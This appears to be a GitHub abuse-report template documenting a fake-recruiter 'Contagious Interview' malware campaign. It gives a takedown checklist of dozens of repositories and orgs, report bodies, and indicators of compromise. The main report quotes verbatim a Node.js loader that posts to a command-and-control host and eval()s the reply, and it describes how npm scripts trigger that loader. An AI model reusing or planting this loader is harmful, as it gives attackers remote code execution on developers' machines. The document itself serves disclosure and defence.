# Abuse report — GitHub Trust & Safety

This case can be reported through **two separate filings** to provide visibility into both relevant kinds of GitHub Trust & Safety action:

- **Content takedown** — disabling the malicious repository (`Malware or exploits` category). Filed against `realfraction/realfraction`.
- **Account-level reporting** — reporting the operator-controlled organization that hosts it. Filed against `realfraction`.

Both report types route to T&S; we're not assuming a specific response. Filing across both ensures the observations are visible to whichever review process is relevant.

A third filing — against the user `urmybestfriend` who authored the trojan commit — is **not** included in the per-entity filing checklist below. The same identity also appears as author on multiple other commits in the repo's history that read as plausible legitimate work. Without seeing the author's other-repo activity, it is not safe to ask GitHub to suspend the account; the malicious authorship could be a re-attribution at fork-import time rather than an attribute of the live account. If you have independent evidence that `urmybestfriend` is a single-purpose operator persona (e.g., the account is recently created, has no unrelated repo activity, and its other public contributions all trace back to campaign-shape repos), add a sixth filing patterned on the org filing below.

All filings go through the same GitHub abuse contact form at **https://github.com/contact/report-abuse**. What differentiates the filings is two fields in the form:

1. **Which URL/handle you put in the "content/account being reported" field** — a repo URL for the content takedown, an org URL for the account-level report.
2. **Which abuse category you select** — `Malware or exploits` for the content takedown, an account-level category (typically `Other` or the closest matching option) for the account-level report.

(GitHub also exposes per-entity "Report" links on org pages — those route to the same contact form with the entity URL pre-filled, which is the easier path for the org filing.)

This file is a **copy-paste template**. Before submitting, replace the placeholders below with values from this incident's [case file](./README.md) (or from your direct knowledge of the repo you were pointed at).

### Placeholders to fill in

Placeholders appear in the code blocks as `[descriptive label in square brackets]` — find-and-replace each one before pasting.

| Placeholder | What to put | Where to find it |
|---|---|---|
| `[reported repository URL]` | Full URL of the repository being reported, typically `https://github.com/realfraction/realfraction` | The recruiter's link, or this case file |
| `[your name / handle]` | How you want the "Reported by" line to read | (yourself) |

> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching body code block, do the placeholder fill-in, and paste it into the form.**

---

## Filing checklist

Work top-down. The first filing is the content/malware report on the original repo and carries the full technical evidence; subsequent filings are repo-takedowns for each confirmed sibling and account-level reports against the operator-owned orgs/users identified by the 2026-05-18 cluster-expansion sweep (see [README §7.5](./README.md#75-confirmed-sibling-repos-2026-05-18-cluster-expansion-sweep) and [§7.8](./README.md#78-operator-account-classification)).

| # | Target | Action type | URL to paste in the form's "what are you reporting" field | Abuse category to select | Body to paste |
|---|---|---|---|---|---|
| 1 | The repo `realfraction/realfraction` (sub-shape A) | Content takedown | `[reported repository URL]` | **Malware or exploits** | [Main report](#main-report) |
| 2 | Org `realfraction` | Account-level | `https://github.com/realfraction` | **Other** (explain in body) | [Org filing](#org-filing) — substitute the operator org's name and the repo it hosts |
| 3 | Repo `chainvisita-protocols/realfraction-mvp` (sub-shape A) | Content takedown | `https://github.com/chainvisita-protocols/realfraction-mvp` | **Malware or exploits** | [Main report](#main-report) — substitute the repo URL, the loader path `server/utils/regionChecker.js`, and the C2 suffix `3aeb34a38` |
| 4 | Org `chainvisita-protocols` | Account-level | `https://github.com/chainvisita-protocols` | **Other** | [Org filing](#org-filing) — note in the body that this is the renamed successor to `ChainVisitaTech` and that the org pads its profile with 11 same-day forks of well-known crypto/blockchain projects (credibility-farming TTP) |
| 5 | Repo `slobodanmargetic988/real-world-assets` (sub-shape B; **operator inlined the loader on a likely-compromised-legitimate user's repo** — file the repo, do NOT file the user account) | Content takedown | `https://github.com/slobodanmargetic988/real-world-assets` | **Malware or exploits** | [Main report](#main-report) — substitute loader path `server/controllers/paymentController.js`, C2 host `www.isillegalregion.com`, suffix `3aeb34a39`. Note the loader is missing `.end()` so the request never fires on the wire; static signature still matches; treat as malicious because the operator's intent is unambiguous |
| 6 | Repo `LandinLin/stockx_poc_1.03` (sub-shape C) | Content takedown | `https://github.com/LandinLin/stockx_poc_1.03` | **Malware or exploits** | [Main report](#main-report) — substitute loader path `backend/src/compliance/complianceService.js`, C2 host `www.ipregionchecker.com`, suffix `3aeb34a37`. Note the buggy axios.post header-position; on-wire fingerprint differs from sub-shape A |
| 7 | Repo `devcode8/stock-home-assignment` (sub-shape C) | Content takedown | `https://github.com/devcode8/stock-home-assignment` | **Malware or exploits** | [Main report](#main-report) — same details as #6 |
| 8 | Repo `0xbrentfi/StockX_PoC_1.03` (sub-shape C) | Content takedown | `https://github.com/0xbrentfi/StockX_PoC_1.03` | **Malware or exploits** | [Main report](#main-report) — same details as #6 |
| 9 | Repo `0xbrentfi/StockX_PoC_1.04` (sub-shape C; inferred sibling on confirmed-operator-owned account, not directly verified) | Content takedown | `https://github.com/0xbrentfi/StockX_PoC_1.04` | **Malware or exploits** | [Main report](#main-report) — same details as #6; flag as "inferred sibling — verify loader presence" |
| 10 | User `0xbrentfi` | Account-level | `https://github.com/0xbrentfi` | **Other** | [User filing](#user-filing) — A·S; 6 repos, 2 confirmed campaign-shape (StockX_PoC_1.03/.04) plus 4 small forks; created 2026-02-21 |
| 11 | Repo `Chainbits1/StockX` (sub-shape C) | Content takedown | `https://github.com/Chainbits1/StockX` | **Malware or exploits** | [Main report](#main-report) — same as #6 |
| 12 | Org `Chainbits1` | Account-level | `https://github.com/Chainbits1` | **Other** | [Org filing](#org-filing) — A·S; single-repo single-purpose org created 2026-02-02 |
| 13 | Repo `Lynqex-Labs/Stockx_PoC_v3` (sub-shape C) | Content takedown | `https://github.com/Lynqex-Labs/Stockx_PoC_v3` | **Malware or exploits** | [Main report](#main-report) — same as #6 |
| 14 | Repo `Lynqex-Labs/gas-optimization` (sub-shape C; inferred sibling, not directly verified) | Content takedown | `https://github.com/Lynqex-Labs/gas-optimization` | **Malware or exploits** | [Main report](#main-report) — flag as "inferred sibling — verify loader presence" |
| 15 | Org `Lynqex-Labs` | Account-level | `https://github.com/Lynqex-Labs` | **Other** | [Org filing](#org-filing) — A·S; 7 repos including 2 campaign-shape; profile padded with 5 same-day forks of well-known crypto trading bots (credibility-farming TTP); created 2026-01-10 |
| 16 | Repo `metapulse54/RealEstateDemo` (sub-shape D) | Content takedown | `https://github.com/metapulse54/RealEstateDemo` | **Malware or exploits** | [Main report](#main-report) — substitute loader path `server/mock/users.js`, env-exfil-at-loader-stage axios.post with `{...process.env}` body |
| 17 | Org `metapulse54` | Account-level | `https://github.com/metapulse54` | **Other** | [Org filing](#org-filing) — A·S; single-repo single-purpose org created 2026-05-11 |
| 18 | Repo `RockTxoi/DeFi-Estate` (sub-shape D) | Content takedown | `https://github.com/RockTxoi/DeFi-Estate` | **Malware or exploits** | [Main report](#main-report) — same as #16 |
| 19 | Org `RockTxoi` | Account-level | `https://github.com/RockTxoi` | **Other** | [Org filing](#org-filing) — A·S·C; single-repo single-purpose org; created 2026-04-27 **same day as `realfraction`** |
| 20 | Repo `jaiu3d/DeFi-Estate` (sub-shape D) | Content takedown | `https://github.com/jaiu3d/DeFi-Estate` | **Malware or exploits** | [Main report](#main-report) — same as #16 |
| 21 | Org `jaiu3d` | Account-level | `https://github.com/jaiu3d` | **Other** | [Org filing](#org-filing) — A·S; single-repo single-purpose org created 2026-04-08 |
| 22 | Repo `kio87j/DeFi-Estate` (sub-shape D) | Content takedown | `https://github.com/kio87j/DeFi-Estate` | **Malware or exploits** | [Main report](#main-report) — same as #16 |
| 23 | Repo `kio87j/defi-estate-latest` (sub-shape D; inferred sibling, not directly verified) | Content takedown | `https://github.com/kio87j/defi-estate-latest` | **Malware or exploits** | [Main report](#main-report) — flag as "inferred sibling — verify loader presence" |
| 24 | Org `kio87j` | Account-level | `https://github.com/kio87j` | **Other** | [Org filing](#org-filing) — A·S; 2 repos both campaign-shape; created 2026-04-07 (one day before sibling-named `jaiu3d`'s DeFi-Estate creation) |
| 25 | Repo `ricardomartins9899/SmartPay-Demo` (sub-shape D; **owner classification uncertain — leans operator-owned**) | Content takedown | `https://github.com/ricardomartins9899/SmartPay-Demo` | **Malware or exploits** | [Main report](#main-report) — same as #16. Do NOT file user-level against `ricardomartins9899` without further evidence; the account is single-purpose but its creation date (2025-10-31) is older than typical operator throwaways |
| 26 | Repo `BVSLabs/blockchain-voting-system` (sub-shape E — cross-gen) | Content takedown | `https://github.com/BVSLabs/blockchain-voting-system` | **Malware or exploits** | [Main report](#main-report) — substitute loader path `app/controllers/settingController.js`; env-exfil-at-loader-stage axios.post with `{...process.env}` body |
| 27 | Org `BVSLabs` | Account-level | `https://github.com/BVSLabs` | **Other** | [Org filing](#org-filing) — A·S; single-repo single-purpose org created 2026-04-23 |
| 28 | Repo `Cortexa-org/NitroGem` (sub-shape E — cross-gen) | Content takedown | `https://github.com/Cortexa-org/NitroGem` | **Malware or exploits** | [Main report](#main-report) — same as #26 |
| 29 | User `Cortexa-org` (despite the `-org` suffix this is a *user* account, not an org) | Account-level | `https://github.com/Cortexa-org` | **Other** | [User filing](#user-filing) — A·S; 6 repos all single-purpose vapor-MVP-shape (NitroGem + EHR-Demo + intelhealthcare + intel-healthcare + Neura-MVP + neura-frontend); multi-lure-theme persona; created 2025-09-06 |
| 30 | Repo `eastmade/web3project-momo-token` (sub-shape F; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/eastmade/web3project-momo-token` | **Malware or exploits** | [Main report](#main-report) — substitute loader path `backend/src/utils/redis.js` |
| 31 | Repo `MBhatti26/Purrtal` (sub-shape F; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/MBhatti26/Purrtal` | **Malware or exploits** | [Main report](#main-report) — same as #30 |
| 32 | Repo `fabiolin/schoolmgmt` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/fabiolin/schoolmgmt` | **Malware or exploits** | [Main report](#main-report) — substitute constants file `backend/src/constants/index.js` with C2 `cookie-xi-seven.vercel.app`; loader fetch+eval site elsewhere in same repo |
| 33 | Repo `sharmapranay38/new_age_blockchain` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/sharmapranay38/new_age_blockchain` | **Malware or exploits** | [Main report](#main-report) — loader site `server/controllers/reportController.js`; same C2 as #32 |
| 34 | Repo `shri33/Crypto-Trading-Platform` (sub-shape G/H hybrid; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/shri33/Crypto-Trading-Platform` | **Malware or exploits** | [Main report](#main-report) — loader site `server/controllers/ProductController.js`; uses Function.constructor RCE primitive |
| 35 | Repo `Paulooo0/go-test` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/Paulooo0/go-test` | **Malware or exploits** | [Main report](#main-report) — same as #32 |
| 36 | Repo `KagiyamaWeb/PyPDFMicroservise` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/KagiyamaWeb/PyPDFMicroservise` | **Malware or exploits** | [Main report](#main-report) — same as #32 |
| 37 | Repo `Wilovy09/deby-assignment` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/Wilovy09/deby-assignment` | **Malware or exploits** | [Main report](#main-report) — same as #32 |
| 38 | Repo `pablodiaz2799/solice-skill-test` (sub-shape G; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/pablodiaz2799/solice-skill-test` | **Malware or exploits** | [Main report](#main-report) — same as #32 |
| 39 | Repo `Jay-Sojitra/student-management-system` (sub-shape H; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/Jay-Sojitra/student-management-system` | **Malware or exploits** | [Main report](#main-report) — loader site `backend/src/modules/departments/department-error.js`; C2 `ip-check-api.vercel.app` (already DEPLOYMENT_DISABLED by Vercel); Function.constructor RCE |
| 40 | Repo `sparsh-kr24/Student-Management-System` (sub-shape H; **owner classification uncertain — single-purpose account, older than typical throwaway**) | Content takedown | `https://github.com/sparsh-kr24/Student-Management-System` | **Malware or exploits** | [Main report](#main-report) — same as #39. Do NOT file user-level against `sparsh-kr24` without further evidence |
| 41 | Repo `ahmedraza90/test-fullstack` (sub-shape H; owner is likely compromised legitimate — file repo only) | Content takedown | `https://github.com/ahmedraza90/test-fullstack` | **Malware or exploits** | [Main report](#main-report) — same as #39 |

If a UI label doesn't match exactly (GitHub does adjust placement), the universal fallback for either of these is to open **https://github.com/contact/report-abuse** manually, paste the URL from the third column, select the category from the fourth column, and paste the matching body.

**Filings deliberately NOT included** — the 7 cross-generation repos in §7.5 sub-shape E that are already covered by the AjunaVerse-family abuse report (`jamesm-dev/NitroGem`, `prahaladbelavadi/CoinLocatorDemo`, `sky-cook/tokentradingdapp`, `artemus-jarrett/blockchain-voting-system`, `dappfusion/defi-real-estate`, `InvescoHub/defi-real-estate`, `TechByteX/NitroGem`). When you file against those, mention in the body that they carry **both** the AjunaVerse-earlier loader at `app/controllers/frontController.js` **and** the realfraction-family loader at `app/controllers/settingController.js`.

**Filings deliberately NOT included** — likely-compromised-legitimate / candidate-fooled user accounts. The repos they host are filed for content takedown (above), but the user accounts themselves are not filed for account-level suspension. Owner-classification details are in [README §7.8](./README.md#78-operator-account-classification) and [iocs.json `github.users`](./iocs.json).

---

## Which entities are filed against — and why

The org `realfraction` is filed against at the account level because it shows multiple independent signals consistent with being created specifically for this campaign:

- **Single-repo / single-purpose org.** Hosts exactly one substantive public repository (the campaign one) and no unrelated activity.
- **No legitimate-developer activity surface.** No prior unrelated repos, no member list, no public profile content suggesting real organizational use.
- **Lure-themed contact identity.** Contact email is on a separately-registered `realfraction.xyz` domain that exists only to back the lure brand.

A second-order signal — operator-coordination patterns linking `realfraction` to other known cluster orgs — is *not* currently available. If during a takedown investigation it emerges (e.g., shared registrar, same-day adjacent-ID creation with another known cluster org, bit-identical artifacts), that strengthens the suspension case.

---

## Subject line for both filings

Use this exact subject line (or as close as the form allows):

```
Malicious repository part of "Contagious Interview" developer-targeted RCE campaign — realfraction/realfraction
```

---

## Main report

(For Filing #1 — the repo content takedown.)

Paste the body below into the contact form, having replaced the placeholders.

```text
I am reporting a public GitHub repository that hosts a working remote-code loader designed to compromise developers' machines under the cover of a fake "Web3 real-estate platform" job-interview / take-home assignment.

REPORTED REPOSITORY
[reported repository URL]

VERDICT
Confirmed malicious. The repository contains a Node.js loader that, at module-load time during normal Express server startup, fetches arbitrary JavaScript from an attacker-controlled C2 and executes it via eval() with full Node scope (require, process, child_process etc. all reachable). Triggered by any of `npm start`, `npm test`, `npm run build`, `npm run deploy`, `npm run predeploy`, or `npm run eject` — every npm script in package.json starts the Express server via `concurrently`.

TECHNICAL EVIDENCE — the loader

File: server/utils/regionChecker.js (10 lines, full verbatim):

  const https = require("https");
  const regionCheckApi = 'https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31';
  https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }, res => {
    let data = '';
    res.on('data', c => data += c).on('end', () => {
    if (data === 'blocked') return;
    try { if (JSON.parse(data)?.blocked) return; } catch (_) {}
    try { eval(data); } catch (_) {}
  });
  }).end();

What it does:
1. POSTs to https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31 with header `x-secret-header: secret`.
2. If the response body is the literal string `blocked` or parses to JSON with `{blocked: true}`, returns silently.
3. Otherwise calls `eval(<response body>)` in module scope. This is full RCE on the developer's machine.

The two negative-gate sentinels implement a target-IP allowlist: researcher / sandbox IPs receive `blocked` and never see the live payload, while the developer being interviewed receives the JS body and executes it.

TECHNICAL EVIDENCE — the trigger

The loader is `require()`'d by `server/controllers/userController.js`:

  const regionChecker = require("../utils/regionChecker");

The variable `regionChecker` is never referenced anywhere else in the file. The `require` exists only so the module's top-level `https.request(...)` fires at module load. `userController.js` is loaded by `server/routes/userRoute.js`, which is loaded by `server/app.js`, which is loaded by `server/server.js`. So Express server startup fires the loader, with no client request needed.

`package.json`'s `start`, `test`, `build`, `deploy`, `predeploy`, and `eject` scripts all start the Express server (via `concurrently`), so every common developer command triggers compromise.

TECHNICAL EVIDENCE — the trojan commit

The loader was introduced in commit 8cc5120bfa3a64a6af14936ce821092ea08cd78d by `urmybestfriend`. The commit subject reads `"feat(server): add search, pagination, and apiFeatures utils"` but the only two files touched are `server/utils/errorHandler.js` and `server/utils/regionChecker.js` — neither relates to search, pagination, or apiFeatures. The subject is engineered to blend into `git log` and not reveal the loader.

CAMPAIGN CONTEXT

This is part of the publicly documented "Contagious Interview" / Famous Chollima / Void Dokkaebi developer-targeting cluster. Public reporting on the cluster:
- Microsoft Threat Intelligence: https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
- Trend Micro on Void Dokkaebi: https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html
- ReversingLabs on the fake-recruiter pattern: https://www.reversinglabs.com/blog/fake-recruiter-coding-tests-target-devs-with-malicious-python-packages
- Community catalog of recruiter-scam repos (real_estate/ archetype matches): https://github.com/rubenmarcus/malicious-repositories

The specific archetype — payload triggered from `userController.js`, lure framed as a real-estate-tokenization Web3 MVP — is documented in the `rubenmarcus/malicious-repositories` real_estate/ entries.

INDICATORS OF COMPROMISE
- C2 host: www.ipregionchecker.com (apex: ipregionchecker.com)
- C2 path: /api/ip-check-encrypted/3aeb34a31
- Magic header (client→C2): x-secret-header: secret
- Negative-gate sentinels (C2→client): response body `blocked` or `{"blocked":true}`
- Code-pattern fingerprint: `https.request(...,'x-secret-header','secret',...) + eval(data)` in the same Node module
- File path: server/utils/regionChecker.js
- Trojan commit SHA: 8cc5120bfa3a64a6af14936ce821092ea08cd78d
- Trojan commit author: urmybestfriend
- Trojan commit subject (misleading): feat(server): add search, pagination, and apiFeatures utils

RELEVANT GITHUB ACCEPTABLE-USE POLICY CITATIONS
- "Active malware or exploits" prohibition: https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies (Section: Active Malware or Exploits)
- "Misinformation and disinformation" indirectly: trojan commit message lies about its diff to evade reviewer attention

REQUESTED ACTION
Disable the repository under "Active malware or exploits." See the parallel filing against the owning org `realfraction` for account-level action.

Reported by: [your name / handle]
Date: <today's date>
```

---

## Org filing

(For Filing #2 — the org-level report.)

Paste the body below into the contact form, having replaced the placeholders.

```text
I am reporting the GitHub organization `realfraction` (https://github.com/realfraction) as a single-purpose operator-owned account hosting an active malware repository (`realfraction/realfraction`). A separate content-takedown filing has been submitted against the repository itself; this filing requests organization-level action.

ORG-LEVEL SIGNALS OBSERVED
- Single-repo organization: hosts exactly one substantive public repository, which is the malicious one.
- No member list, no other activity, no contributions to open-source projects.
- Contact email is on a separately registered `realfraction.xyz` lure-brand domain that exists only to back the campaign's "Web3 real-estate platform" framing.
- The hosted repository contains a Node.js loader at `server/utils/regionChecker.js` that POSTs to `https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` with header `x-secret-header: secret` and `eval()`s the response — full RCE on developer machines on `npm start`, `npm test`, `npm run build`, `npm run deploy`, `npm run predeploy`, or `npm run eject`. Full technical evidence is in the parallel content-takedown filing.
- The repo is a member of the publicly documented "Contagious Interview" / Famous Chollima developer-targeting cluster (Microsoft, Trend Micro, ReversingLabs reporting).

ASYMMETRIC HARM
Active malware delivered through a fake-recruiter funnel; each download of the repo and execution of `npm start` is a full compromise of an interviewing developer's machine, with credential theft (cloud, GitHub, npm, AI-provider tokens) and stage-2 persistence as the typical follow-on.

REQUESTED ACTION
Suspend the organization under the "Active Malware or Exploits" and "Inauthentic Activity" provisions of the GitHub Acceptable Use Policy (https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies).

Reported by: [your name / handle]
Date: <today's date>
```

---

## After filing

GitHub typically acknowledges receipt of an abuse report automatically and acts on confirmed-malware filings within a few business days. There is no follow-up needed from your side unless GitHub responds asking for clarification.

If the repository remains live after a week, file a re-report citing the original case number and add any new evidence (e.g., live C2 probe results from an allowlisted vantage point, observed victim IPs, new sibling repos).

If you have access to the registrar or hosting provider of `ipregionchecker.com`, a parallel abuse filing there will help close the campaign even if the GitHub takedown is slow. `whois ipregionchecker.com` will reveal the registrar.
